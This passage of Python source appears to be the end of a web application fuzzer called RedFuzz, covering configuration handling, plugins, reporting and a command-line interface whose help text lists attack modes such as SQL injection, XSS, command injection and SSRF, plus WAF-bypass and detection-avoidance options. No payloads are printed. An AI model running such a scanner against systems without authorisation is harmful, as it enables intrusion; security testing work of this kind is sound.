            self.cookie_rotation = security_config.get('cookie_rotation', False)
            self.header_rotation = security_config.get('header_rotation', False)
            self.request_signature = security_config.get('request_signature', False)
            self.anti_detection = security_config.get('anti_detection', False)
        
        # Apply user agent rotation pool
        if 'user_agents' in self.config:
            self.user_agent_pool = self.config['user_agents']
        
        # Apply crawling settings
        if 'max_crawl_depth' in self.config:
            self.max_crawl_depth = self.config['max_crawl_depth']
        if 'crawl_delay' in self.config:
            self.crawl_delay = self.config['crawl_delay']
        if 'follow_robots_txt' in self.config:
            self.follow_robots_txt = self.config['follow_robots_txt']
        if 'respect_nofollow' in self.config:
            self.respect_nofollow = self.config['respect_nofollow']
        
        # Apply API endpoints
        if 'api_endpoints' in self.config:
            self.api_endpoints = self.config['api_endpoints']
        
        # Apply custom headers
        if 'custom_headers' in self.config:
            self.custom_headers = self.config['custom_headers']
        
        # Apply custom parameters
        if 'custom_parameters' in self.config:
            self.custom_parameters = self.config['custom_parameters']
        
        # Apply file extensions
        if 'file_extensions' in self.config:
            self.file_extensions = self.config['file_extensions']
        
        # Apply directory patterns
        if 'directory_patterns' in self.config:
            self.directory_patterns = self.config['directory_patterns']
        
        # Apply output settings
        if 'output' in self.config:
            output_config = self.config['output']
            self.output_file = output_config.get('file', 'redfuzz_results.json')
            self.output_format = output_config.get('format', 'json')
            self.include_evidence = output_config.get('include_evidence', True)
            self.include_requests = output_config.get('include_requests', True)
            self.include_responses = output_config.get('include_responses', True)
            self.include_timing = output_config.get('include_timing', True)
            self.include_headers = output_config.get('include_headers', True)
            self.include_cookies = output_config.get('include_cookies', True)
        
        # Apply reporting settings
        if 'reporting' in self.config:
            reporting_config = self.config['reporting']
            self.generate_html = reporting_config.get('generate_html', True)
            self.generate_pdf = reporting_config.get('generate_pdf', False)
            self.include_charts = reporting_config.get('include_charts', True)
            self.include_statistics = reporting_config.get('include_statistics', True)
            self.include_recommendations = reporting_config.get('include_recommendations', True)
            self.severity_colors = reporting_config.get('severity_colors', True)
        
        # Apply logging settings
        if 'logging' in self.config:
            logging_config = self.config['logging']
            self.log_level = logging_config.get('level', 'INFO')
            self.log_file = logging_config.get('file', 'redfuzz.log')
            self.log_format = logging_config.get('format', '%(asctime)s - %(levelname)s - %(message)s')
            self.log_max_file_size = logging_config.get('max_file_size', '10MB')
            self.log_backup_count = logging_config.get('backup_count', 5)
            self.log_console_output = logging_config.get('console_output', True)
            self.log_file_output = logging_config.get('file_output', True)
            self.log_include_timestamps = logging_config.get('include_timestamps', True)
            self.log_include_thread_id = logging_config.get('include_thread_id', True)
        
        # Apply plugin system settings
        if 'plugin_system' in self.config:
            plugin_config = self.config['plugin_system']
            if plugin_config.get('enabled', True):
                self.plugin_enabled = True
                self.plugin_directory = plugin_config.get('plugin_directory', './plugins')
                self.plugins_to_load = plugin_config.get('plugins', [])
                self.plugin_config = plugin_config.get('plugin_config', {})
        
        # Apply monitoring settings
        if 'monitoring' in self.config:
            monitoring_config = self.config['monitoring']
            self.monitoring_enabled = monitoring_config.get('enabled', False)
            self.check_interval = monitoring_config.get('check_interval', 60)
            self.alert_on_vulnerability = monitoring_config.get('alert_on_vulnerability', True)
            self.alert_on_completion = monitoring_config.get('alert_on_completion', True)
            self.alert_on_error = monitoring_config.get('alert_on_error', True)
            self.webhook_url = monitoring_config.get('webhook_url', '')
            self.email_alerts = monitoring_config.get('email_alerts', False)
        
        # Apply export settings
        if 'export' in self.config:
            export_config = self.config['export']
            self.export_csv = export_config.get('csv', False)
            self.export_xml = export_config.get('xml', False)
            self.export_json = export_config.get('json', True)
            self.export_html = export_config.get('html', True)
            self.export_pdf = export_config.get('pdf', False)
            self.include_raw_data = export_config.get('include_raw_data', False)
            self.compress_output = export_config.get('compress_output', False)
            self.output_directory = export_config.get('output_directory', './reports')
        
        # Apply validation settings
        if 'validation' in self.config:
            validation_config = self.config['validation']
            self.validate_url = validation_config.get('validate_url', True)
            self.validate_payloads = validation_config.get('validate_payloads', True)
            self.check_file_permissions = validation_config.get('check_file_permissions', True)
            self.verify_plugin_compatibility = validation_config.get('verify_plugin_compatibility', True)
            self.test_connectivity = validation_config.get('test_connectivity', True)
        
        # Apply debug settings
        if 'debug' in self.config:
            debug_config = self.config['debug']
            self.debug_enabled = debug_config.get('enabled', False)
            self.show_raw_requests = debug_config.get('show_raw_requests', False)
            self.show_raw_responses = debug_config.get('show_raw_responses', False)
            self.show_timing_details = debug_config.get('show_timing_details', False)
            self.show_memory_usage = debug_config.get('show_memory_usage', False)
            self.profile_performance = debug_config.get('profile_performance', False)
            self.save_debug_logs = debug_config.get('save_debug_logs', False)
        
        self.log("Configuration settings applied successfully")

    def execute_plugins_on_results(self, results):
        """Execute plugins with scan results"""
        if not hasattr(self, 'plugin_enabled') or not self.plugin_enabled:
            return
        
        if not results:
            self.log("No results to send to plugins")
            return
        
        # Get plugin configuration
        plugin_config = getattr(self, 'plugin_config', {})
        plugins_to_load = getattr(self, 'plugins_to_load', [])
        
        for plugin_name in plugins_to_load:
            try:
                # Get plugin-specific configuration
                plugin_settings = plugin_config.get(plugin_name, {})
                
                # Prepare data for plugin
                plugin_data = {
                    'results': results,
                    'target_url': self.target_url,
                    'scan_time': getattr(self, 'scan_start_time', None),
                    'config': plugin_settings
                }
                
                # Execute plugin
                self.log(f"Executing plugin: {plugin_name}")
                result = self.plugin_manager.execute_plugin(plugin_name, plugin_data)
                
                if result:
                    self.log(f"Plugin {plugin_name} executed successfully")
                else:
                    self.log(f"Plugin {plugin_name} returned no result")
                    
            except Exception as e:
                self.log(f"Error executing plugin {plugin_name}: {str(e)}")
    
    def generate_html_report(self, results):
        """Generate HTML report based on config settings"""
        try:
            from report_generator import ReportGenerator
            import time
            
            scan_duration = time.time() - getattr(self, 'scan_start_time', time.time())
            report_gen = ReportGenerator()
            
            # Use configured output directory
            output_dir = getattr(self, 'output_directory', './reports')
            
            html_file = report_gen.generate_html_report(
                results, 
                self.target_url, 
                scan_duration,
                output_dir=output_dir
            )
            self.log(f"HTML report generated: {html_file}")
            
        except ImportError:
            self.log("Warning: Report generator not available. Install required dependencies.")
        except Exception as e:
            self.log(f"Error generating HTML report: {str(e)}")
    
    def cleanup(self):
        """Cleanup resources and close connections"""
        try:
            # Close session
            if hasattr(self, 'session') and self.session:
                self.session.close()
            
            # Stop TUI if running
            if hasattr(self, 'tui_instance') and self.tui_instance:
                if hasattr(self.tui_instance, 'stop'):
                    self.tui_instance.stop()
            
            # Clear any remaining threads
            import threading
            for thread in threading.enumerate():
                if thread.name.startswith('ThreadPoolExecutor'):
                    thread.join(timeout=1.0)
            
            # Force garbage collection
            import gc
            gc.collect()
            
        except Exception as e:
            if self.verbose:
                self.log(f"⚠️  Cleanup warning: {str(e)[:50]}...")
    
    def apply_retry_logic(self, func, *args, **kwargs):
        """Apply retry logic based on config settings"""
        max_retries = getattr(self, 'max_retries', 3)
        retry_delay = getattr(self, 'retry_delay', 1.0)
        
        for attempt in range(max_retries + 1):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                if attempt == max_retries:
                    raise e
                
                if self.verbose:
                    self.log(f"Attempt {attempt + 1} failed, retrying in {retry_delay}s: {str(e)}")
                
                import time
                time.sleep(retry_delay)

def setup_optional_dependencies():
    """Setup and configure optional dependencies for better performance"""
    global json, JSON_FAST, JSON_LIBRARY
    
    # Log which JSON library is being used
    if JSON_FAST:
        print(f"🚀 Using fast JSON library: {JSON_LIBRARY}")
    else:
        print(f"📝 Using standard JSON library (install ujson or orjson for better performance)")
    
    # Log SSL improvements
    if SSL_IMPROVED:
        print(f"🔒 Using improved SSL with pyOpenSSL")
    
    # Log SOCKS support
    if SOCKS_SUPPORT:
        print(f"🧦 SOCKS proxy support available")
    
    # Log TUI availability
    if RICH_AVAILABLE:
        print(f"🎨 Rich TUI available")
    
    # Log YAML availability
    if YAML_AVAILABLE:
        print(f"📄 YAML support available")
    
    return {
        'json_fast': JSON_FAST,
        'json_library': JSON_LIBRARY,
        'ssl_improved': SSL_IMPROVED,
        'socks_support': SOCKS_SUPPORT,
        'rich_available': RICH_AVAILABLE,
        'yaml_available': YAML_AVAILABLE
    }

def main():
    # Setup signal handler for graceful shutdown
    import signal
    import sys
    
    def signal_handler(sig, frame):
        print("\n🛑 Received interrupt signal. Shutting down gracefully...")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Setup optional dependencies first
    deps_info = setup_optional_dependencies()
    
    parser = argparse.ArgumentParser(
        description='RedFuzz v5.0.0 - Advanced Web Application Fuzzer with Stateful Fuzzing, OpenAPI Integration, and Plugin Support',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  Basic Usage:
    python redfuzz.py http://example.com/page.php?id=1
    python redfuzz.py http://example.com/page.php?id=1 --mode sql
    python redfuzz.py http://example.com/page.php?id=1 --mode xss --fast
    python redfuzz.py http://example.com/page.php?id=1 --method POST --post-data "user=admin&pass=test"

  Advanced Features:
    python redfuzz.py http://example.com/ --crawl --mode all --tui
    python redfuzz.py http://example.com/api/ --openapi-spec swagger.json --api-test
    python redfuzz.py http://example.com/ --stateful --login-url http://example.com/login --login-data 'user=admin&pass=admin'
    python redfuzz.py http://example.com/ --context-aware --waf-bypass
    python redfuzz.py http://example.com/ --fuzz-headers --auto-verify --evidence-collection

  Performance & Output:
    python redfuzz.py http://example.com/ --ultra-fast --threads 20
    python redfuzz.py http://example.com/ --report-format html --output results.html
    python redfuzz.py http://example.com/ --plugin-dir ./custom_plugins
    python redfuzz.py http://example.com/ --proxy http://127.0.0.1:8080 --cookies "session=abc123"

PAYLOAD MODES:
  all        - All payload types (default)
  sql        - SQL injection only
  xss        - Cross-site scripting only
  lfi        - Local file inclusion only
  rfi        - Remote file inclusion only
  command    - Command injection only
  header     - HTTP header injection only
  redirect   - Open redirect only
  ssrf       - Server-side request forgery only
  auth       - Authentication bypass only
  jsonp      - JSONP injection only
  standard   - Standard attack vectors (SQL, XSS, LFI, RFI, Command)
  fast       - Fast mode with reduced payloads
  ultra_fast - Ultra fast mode with minimal payloads

FEATURES:
  • Stateful Fuzzing: Maintain session state across requests
  • OpenAPI Integration: Auto-discover and test API endpoints
  • Smart Rate Limiting: Dynamic request timing to avoid detection
  • WAF Bypass: Advanced techniques to bypass web application firewalls
  • Context-Aware: Parameter-specific payload generation
  • Plugin System: Extensible architecture for custom functionality
  • TUI Interface: Real-time progress monitoring and statistics
  • Evidence Collection: Detailed vulnerability evidence and verification
  • Multi-threading: Concurrent request processing
  • Proxy Support: HTTP and SOCKS proxy support

PERFORMANCE TIPS:
  • Use --fast or --ultra-fast for quick testing
  • Increase --threads for faster scanning (default: 10)
  • Install ujson/orjson for faster JSON processing
  • Install pyOpenSSL for improved SSL handling
  • Install PySocks for SOCKS proxy support

SECURITY NOTES:
  • Only test applications you own or have permission to test
  • Be aware of rate limiting and legal implications
  • Use responsibly and ethically
        """
    )
    
    # Basic arguments
    parser.add_argument('url', help='Target URL to fuzz (e.g., http://example.com/page.php?id=1)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of concurrent threads (default: 10, max: 50)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output with detailed logging')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode - minimal output only')
    parser.add_argument('--config', help='Configuration file path (YAML/JSON format)')
    parser.add_argument('--proxy', help='Proxy URL (http://proxy:port, https://proxy:port, or socks5://proxy:port)')
    parser.add_argument('--cookies', help='Cookies string (format: name1=value1;name2=value2)')
    
    # Advanced fuzzing options
    parser.add_argument('--context-aware', action='store_true', help='Enable context-aware payload generation based on parameter names')
    parser.add_argument('--waf-bypass', action='store_true', help='Enable WAF bypass techniques (encoding, obfuscation)')
    parser.add_argument('--crawl', action='store_true', help='Enable website crawling to discover endpoints automatically')
    parser.add_argument('--api-test', action='store_true', help='Enable REST API testing mode')
    
    # Stateful fuzzing features
    parser.add_argument('--stateful', action='store_true', help='Enable stateful fuzzing with session management')
    parser.add_argument('--login-url', help='Login URL for stateful fuzzing (required with --stateful)')
    parser.add_argument('--login-data', help='Login credentials (format: user=admin&pass=admin)')
    parser.add_argument('--openapi-spec', help='OpenAPI/Swagger specification file path for API testing')
    
    # Verification and evidence
    parser.add_argument('--auto-verify', action='store_true', default=True, help='Auto-verify discovered vulnerabilities (default: enabled)')
    parser.add_argument('--no-auto-verify', dest='auto_verify', action='store_false', help='Disable automatic vulnerability verification')
    parser.add_argument('--evidence-collection', action='store_true', default=True, help='Collect detailed evidence for vulnerabilities (default: enabled)')
    parser.add_argument('--no-evidence', dest='evidence_collection', action='store_false', help='Disable evidence collection')
    
    # Performance and plugins
    parser.add_argument('--plugin-dir', help='Directory containing custom plugins')
    parser.add_argument('--smart-rate-limit', action='store_true', default=True, help='Enable smart rate limiting (default: enabled)')
    parser.add_argument('--no-rate-limit', dest='smart_rate_limit', action='store_false', help='Disable rate limiting (use with caution)')
    parser.add_argument('--fast', action='store_true', help='Fast mode - reduced payload set for quick testing')
    parser.add_argument('--ultra-fast', action='store_true', help='Ultra fast mode - minimal payload set for very quick testing')
    
    # Output and reporting
    parser.add_argument('--tui', action='store_true', help='Enable Text User Interface for real-time monitoring')
    parser.add_argument('--report-format', choices=['html', 'json', 'both'], help='Generate reports in specified format(s)')
    parser.add_argument('--output', help='Output file path for saving results')
    
    # HTTP method and data
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST', 'PUT', 'DELETE'], help='HTTP method to use (default: GET)')
    parser.add_argument('--post-data', help='POST data string (format: param1=value1&param2=value2)')
    parser.add_argument('--fuzz-headers', action='store_true', help='Fuzz HTTP headers in addition to parameters')
    
    # Custom payloads
    parser.add_argument('--custom-payloads', help='File path containing custom payloads (one per line)')
    parser.add_argument('--payload-categories', nargs='+', help='Specific payload categories to use (e.g., sql xss lfi)')
    
    # Payload mode selection
    parser.add_argument('--mode', choices=['all', 'sql', 'xss', 'lfi', 'rfi', 'command', 'header', 'redirect', 'ssrf', 'auth', 'jsonp', 'standard', 'fast', 'ultra_fast'], 
                       default='all', help='Payload mode to use (default: all)')
    
    args = parser.parse_args()
    
    try:
        # Initialize fuzzer
        fuzzer = RedFuzz(
            target_url=args.url,
            threads=args.threads,
            timeout=args.timeout,
            verbose=args.verbose,
            config_file=args.config,
            tui=args.tui
        )
        
        # Set quiet mode
        fuzzer.quiet_mode = args.quiet
        
        # Configure proxy if specified
        if args.proxy:
            fuzzer.set_proxy(args.proxy)
        
        # Configure cookies if specified
        if args.cookies:
            fuzzer.set_cookies(args.cookies)
        
        # Load OpenAPI spec if specified
        if args.openapi_spec:
            if fuzzer.load_openapi_spec(args.openapi_spec):
                print(f"Loaded OpenAPI specification: {args.openapi_spec}")
            else:
                print(f"Failed to load OpenAPI specification: {args.openapi_spec}")
                return
        
        # Configure plugin directory if specified
        if args.plugin_dir:
            fuzzer.plugin_manager.plugin_dir = Path(args.plugin_dir)
            fuzzer.plugin_manager.load_plugins()
        
        # Configure evidence collection
        fuzzer.evidence_collection = args.evidence_collection
        fuzzer.auto_verify = args.auto_verify
        
        # Configure smart rate limiting
        if not args.smart_rate_limit:
            fuzzer.rate_limiter = None
        
        # Load custom payloads if specified
        custom_payloads = []
        if args.custom_payloads:
            try:
                with open(args.custom_payloads, 'r') as f:
                    custom_payloads = [line.strip() for line in f if line.strip()]
                print(f"Loaded {len(custom_payloads)} custom payloads")
            except Exception as e:
                print(f"Error loading custom payloads: {e}")
        
        # Parse POST data if specified
        post_data = None
        if args.post_data:
            post_data = dict(item.split('=') for item in args.post_data.split('&'))
        
        # Parse login data if specified
        login_data = None
        if args.login_data:
            login_data = dict(item.split('=') for item in args.login_data.split('&'))
        
        # Run fuzzing
        results = []
        if args.stateful:
            print("Starting stateful fuzzing...")
            vulnerabilities = fuzzer.run_stateful_fuzzing(
                login_url=args.login_url,
                login_data=login_data
            )
            fuzzer.vulnerabilities = vulnerabilities
            results = vulnerabilities
        elif args.openapi_spec and fuzzer.openapi_spec:
            print("Starting API fuzzing with OpenAPI specification...")
            vulnerabilities = []
            for endpoint in fuzzer.api_endpoints:
                endpoint_vulns = fuzzer.fuzz_api_endpoint(endpoint)
                vulnerabilities.extend(endpoint_vulns)
            fuzzer.vulnerabilities = vulnerabilities
            results = vulnerabilities
        else:
            # Standard fuzzing
            results = fuzzer.run(
                mode=args.mode,
                custom_payloads=custom_payloads,
                method=args.method,
                post_data=post_data,
                fuzz_headers=args.fuzz_headers,
                context_aware=args.context_aware,
                waf_bypass=args.waf_bypass,
                crawl=args.crawl,
                api_test=args.api_test,
                report_format=args.report_format,
                fast_mode=args.fast,
                ultra_fast_mode=args.ultra_fast
            )
        
        # Show TUI summary if enabled
        if args.tui and fuzzer.tui_instance:
            fuzzer.tui_instance.show_summary(results)
        else:
            # Display results
            fuzzer.display_results(results)
        
        # Final cleanup
        fuzzer.cleanup()

        # Execute plugins and generate reports - CRITICAL FIX for proper execution order
        if results:
            # Execute plugins on the final results
            if hasattr(fuzzer, 'plugin_enabled') and fuzzer.plugin_enabled:
                fuzzer.execute_plugins_on_results(results)
            elif hasattr(fuzzer, 'plugin_manager') and fuzzer.plugin_manager.plugins:
                fuzzer.execute_plugins_on_results(results)

            # Generate reports if requested
            if args.report_format in ["html", "json", "both"]:
                try:
                    from report_generator import ReportGenerator
                    scan_duration = time.time() - fuzzer.scan_start_time
                    report_gen = ReportGenerator()
                    output_dir = os.path.dirname(args.output) if args.output else 'reports'
                    
                    if args.report_format in ["html", "both"]:
                        html_file = report_gen.generate_html_report(results, fuzzer.target_url, scan_duration, output_dir)
                        print(f"HTML report generated: {html_file}")

                    if args.report_format in ["json", "both"]:
                        json_file = report_gen.generate_json_report(results, fuzzer.target_url, scan_duration, output_dir)
                        print(f"JSON report generated: {json_file}")

                except ImportError:
                    print("Warning: Report generator not available. Install required dependencies.")
                except Exception as e:
                    print(f"Error generating report: {e}")

            # Save results to file if specified
            if args.output and args.report_format not in ["json", "both"]:
                fuzzer.save_results(results, filename=args.output)
    
    except requests.exceptions.ConnectionError:
        print("Error: Connection failed. Check if the target URL is accessible.")
    except requests.exceptions.Timeout:
        print("Error: Request timeout. The server is not responding.")
    except requests.exceptions.InvalidURL:
        print("Error: Invalid URL format. Please provide a valid URL.")
    except requests.exceptions.SSLError:
        print("Error: SSL certificate verification failed.")
    except requests.exceptions.HTTPError as e:
        print(f"Error: HTTP error occurred: {e}")
    except requests.exceptions.RequestException as e:
        print(f"Error: Request failed: {e}")
    except KeyboardInterrupt:
        print("\nScan interrupted by user.")
    except Exception as e:
        print(f"Unexpected error: {e}")

if __name__ == "__main__":
    main() 